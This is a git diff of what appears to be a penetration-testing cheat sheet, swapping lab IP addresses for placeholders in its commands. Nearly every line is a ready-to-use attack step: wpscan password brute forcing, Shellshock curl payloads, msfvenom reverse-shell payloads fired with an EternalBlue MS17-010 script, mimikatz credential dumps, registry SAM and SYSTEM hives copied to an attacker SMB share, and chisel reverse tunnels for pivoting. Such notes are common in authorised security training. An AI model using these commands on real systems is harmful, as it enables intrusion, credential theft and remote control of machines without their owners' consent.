@@ -37,7 +37,7 @@ proxychains4 -q nmap -Pn -n -sT -p PORT(S) -vv --open
 wpscan --url URL --plugins-detection aggressive -e vp
 wpscan --url URL --plugins-detection aggressive -e ap
 # Brute Force login, will take very long time. Not recommended unless you have short listed wordlist and usernames
-wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
+wpscan --url http://IP/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
 ```
 
 ### hydra
@@ -340,9 +340,9 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o rev.war
 ### ShellShock
 
 ```bash
-curl -A "() { :; }; PAYLOAD" http://192.168.57.22/cgi-bin/cgi-script 
+curl -A "() { :; }; PAYLOAD" http://IP/cgi-bin/cgi-script 
  
-curl -H "User-Agent: () { :; }; PAYLOAD" http://192.168.57.22/cgi-bin/cgi-script
+curl -H "User-Agent: () { :; }; PAYLOAD" http://IP/cgi-bin/cgi-script
 ```
 
 ### drupal
@@ -486,7 +486,7 @@ msfvenom -p cmd/unix/reverse_netcat LHOST=IP LPORT=PORT -f python
 msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=IP LPORT=PORT -f exe -o payload.exe
 python2 /opt/MS17-010/send_and_execute.py TARGET_IP payload.exe
 # If this does not work, use the paylaod created by the following commands
-msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=10.10.14.28 LPORT=443 -f raw -o sc_x64_payload.bin
+msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=IP LPORT=443 -f raw -o sc_x64_payload.bin
 nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
 cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
 ```
@@ -770,7 +770,7 @@ There might be some valuable information for pivoting over the network, post exp
 .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit" > .\sekurlsa_logonpassword.txt
 .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit" > lsadump_dump.txt
 # Start impacket smbserver before run next
-net use X: \\192.168.45.248\share /user:USER PASS
+net use X: \\IP\share /user:USER PASS
 reg save HKLM\SAM C:\users\public\SAM
 reg save HKLM\SYSTEM C:\users\public\SYSTEM
 copy .\*.txt X:\hashes\
@@ -860,9 +860,9 @@ Pivoting and port forwarding allow you to access internal applications or hosts
 ```
 |     |     |
 | --- | --- |
-| chisel client 10.10.14.3:9001 R:80:127.0.0.1:80 | Listen on Kali 80, forward to localhost port 80 on client |
-| chisel client 10.10.14.3:9001 R:4444:ANOTHER_HOST:80 | Listen on Kali 4444, forward to ANOTHER_HOST(not the connected one) port 80 |
-| chisel client 10.10.14.3:9001 R:socks | Create SOCKS5 listener on 1080 on Kali, proxy through client, add `socks5 127.0.0.1 1080` to `/etc/proxychains4.conf` |
+| chisel client SERVER_IP:9001 R:80:127.0.0.1:80 | Listen on Kali 80, forward to localhost port 80 on client |
+| chisel client SERVER_IP:9001 R:4444:ANOTHER_HOST:80 | Listen on Kali 4444, forward to ANOTHER_HOST(not the connected one) port 80 |
+| chisel client SERVER_IP:9001 R:socks | Create SOCKS5 listener on 1080 on Kali, proxy through client, add `socks5 127.0.0.1 1080` to `/etc/proxychains4.conf` |
 
 ### SSH port forwarding 
 #### 1. Local port forward, doing a local port forward proxy with jump host local port and target port. So that the exploit can go through from jump box to target machine and port
